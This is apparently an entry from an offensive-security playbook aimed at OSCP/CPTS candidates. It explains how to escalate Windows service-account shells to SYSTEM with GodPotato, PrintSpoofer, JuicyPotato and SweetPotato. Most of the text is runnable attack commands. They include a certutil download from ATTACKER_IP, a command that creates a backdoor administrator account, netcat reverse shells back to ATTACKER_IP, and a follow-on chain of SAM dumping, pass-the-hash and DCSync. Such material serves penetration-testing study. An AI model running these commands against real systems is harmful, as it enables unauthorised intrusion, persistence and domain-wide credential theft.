---
id: token-impersonation
title: Token Impersonation (SeImpersonate)
stage: privesc
tags: [windows]
summary: Abuse SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to impersonate SYSTEM — present on virtually every service account, IIS app pool, and SQL Server account.
leads_to:
  - system-shell
  - windows-stored-creds
  - dcsync
---

## Prerequisites

A shell running as a Windows service account (MSSQL, IIS, WinRM as a service account, etc.). `whoami /priv` must show `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. GodPotato binary transferred to target (`C:\Windows\Temp\`).

Potato attacks exploit the Windows token impersonation model — service accounts have the right to impersonate any connecting client, and these tools trick a SYSTEM-level process into connecting. GodPotato works across the widest range of Windows Server versions (2012–2022) and should be your first attempt. SeImpersonate is the single most common Windows privesc path on OSCP/CPTS.

## Quick Win

> Check for the privilege, then run GodPotato immediately — `whoami /priv` → GodPotato → SYSTEM.

```bash
whoami /priv
# Look for: SeImpersonatePrivilege — Enabled

.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

## Transfer Tools

> Get the potato binary to the target before attempting.

```powershell
# From evil-winrm
upload /path/to/GodPotato-NET4.exe C:\Windows\Temp\gp.exe

# From cmd/web shell
certutil -urlcache -f http://ATTACKER_IP:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
```

## GodPotato (Widest Compatibility)

> Try this first — works Windows Server 2012–2022.

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"
```

## PrintSpoofer (Windows 10 / Server 2019+)

> Spawns a SYSTEM shell via the Print Spooler — cleaner but limited to newer OS.

```powershell
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe ATTACKER_IP PORT -e cmd"
```

## JuicyPotato / SweetPotato (Older Systems)

> Use when GodPotato fails — JuicyPotato requires a working CLSID for the target OS.

```powershell
# JuicyPotato (Windows < Server 2019)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# SweetPotato
.\SweetPotato.exe -e EfsRpc -p .\nc.exe -a "ATTACKER_IP PORT -e cmd"
```

## Leads To

SYSTEM shell → dump SAM and LSA secrets (`reg save HKLM\SAM`, `reg save HKLM\SYSTEM`) → pass-the-hash laterally. On a domain-joined machine → run SharpHound as SYSTEM → BloodHound paths. SYSTEM on DC → DCSync for all domain hashes. SYSTEM on any machine → grab local admin hash → spray subnet.
